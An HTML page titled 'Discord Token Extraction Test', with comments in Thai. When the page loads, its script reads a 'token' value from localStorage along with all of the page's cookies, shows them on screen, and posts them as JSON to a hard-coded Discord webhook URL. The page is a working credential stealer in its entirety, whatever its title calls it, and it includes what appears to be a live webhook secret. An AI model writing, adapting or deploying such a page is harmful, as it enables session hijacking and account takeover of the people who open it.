<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Token Extraction Test</title>
</head>
<body>
    <h1>Discord Token Extraction Test</h1>
    <p id="output"></p>

    <script>
        window.onload = function() {
            // ฟังก์ชันเพื่อดึง token จาก localStorage
            function getTokenFromLocalStorage() {
                let token = localStorage.getItem('token');
                return token;
            }

            // ฟังก์ชันเพื่อดึง cookies
            function getCookies() {
                let cookies = document.cookie;
                return cookies;
            }

            // ดึงข้อมูลจาก localStorage และ cookies
            let token = getTokenFromLocalStorage();
            let cookies = getCookies();

            // สร้างข้อความที่จะส่งไป
            let payload = {
                token: token,
                cookies: cookies
            };

            // แสดงผลลัพธ์ในหน้า HTML
            document.getElementById('output').textContent = `Token: ${token}\nCookies: ${cookies}`;

            // ส่งข้อมูลไปยัง URL ที่กำหนด
            fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.text())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
        };
    </script>
</body>
</html>
